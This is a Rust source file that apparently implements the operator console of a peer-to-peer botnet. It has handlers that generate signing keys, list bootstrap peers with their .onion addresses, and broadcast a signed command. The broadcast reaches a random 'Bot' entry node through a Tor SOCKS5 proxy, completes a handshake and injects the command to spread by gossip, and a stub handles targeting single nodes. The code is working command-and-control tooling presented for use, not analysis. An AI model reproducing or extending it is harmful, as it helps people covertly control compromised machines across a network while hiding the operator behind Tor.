use std::path::PathBuf;
use crate::crypto;
use crate::network::GhostClient;
use tokio_tungstenite::MaybeTlsStream;
use tokio::net::TcpStream;
use tokio_socks::tcp::Socks5Stream;

pub async fn handle_keygen(output: PathBuf) {
    let pub_key = crypto::generate_key(&output);
    println!("Generated Key at: {}", output.display());
    println!("Public Key: {}", pub_key);
}

pub async fn handle_list(bootstrap: String) {
    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to connect to Bootstrap: {}", e);
            return;
        }
    };
    
    // In Mesh, we ask Bootstrap for peers
    match client.get_peers().await {
        Ok(peers) => {
             println!("Bootstrap Registry ({})", peers.len());
             for (i, p) in peers.iter().enumerate() {
                 println!("{}. {} ({})", i+1, p.pub_key, p.onion_address);
             }
        }
        Err(e) => eprintln!("Error fetching peers: {}", e),
    }
}

pub async fn handle_target(_bootstrap: String, _key: PathBuf, _target: String, _cmd: String) {
    println!("Direct targeting in Mesh requires connecting to specific .onion. Not implemented in this CLI yet.");
}

pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String) {
    let key = crypto::load_key(&key_path);
    
    // 1. Connect to Bootstrap to find an entry node
    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Conn Error: {}", e);
            return;
        }
    };
    
    println!("Fetching entry nodes...");
    let peers = match client.get_peers().await {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to get peers: {}", e);
            return;
        }
    };
    
    if peers.is_empty() {
        println!("No nodes found in Bootstrap to inject command.");
        return;
    }
    
    // 2. Pick Random Entry Node
    use rand::seq::SliceRandom;
    let entry = peers.choose(&mut rand::thread_rng()).unwrap();
    println!("Selected Entry Node: {} ({})", entry.pub_key, entry.onion_address);
    
    // Disconnect from Bootstrap (Drop client)
    drop(client);
    
    // 3. Connect to Entry Node via Tor SOCKS5
    let proxy_addr = "127.0.0.1:9050"; // Standard Tor SOCKS port
    let onion_host = &entry.onion_address;
    let onion_port = 80; // Standard for our Hidden Service
    
    println!("Connecting to Entry Node via Tor Proxy ({}) ...", proxy_addr);
    let mut node_client = match GhostClient::<Socks5Stream<TcpStream>>::connect_via_tor(onion_host, onion_port, proxy_addr).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to connect to Entry Node via Tor: {}", e);
            eprintln!("Ensure Tor is running at {} and the Bot is online.", proxy_addr);
            return;
        }
    };
    
    println!("Connected! Performing Handshake...");
    let session_key = match node_client.handshake().await {
        Ok(k) => k,
        Err(e) => {
             eprintln!("Handshake Failed: {}", e);
             return;
        }
    };
    println!("Handshake Complete. Session Key Derived."); 
    
    let payload = crypto::create_payload(cmd);
    
    if let Err(e) = node_client.inject_command(payload, &key, &session_key).await {
        eprintln!("Injection Failed: {}", e);
    } else {
        println!("Gossip Injected. Disconnecting.");
    }
}
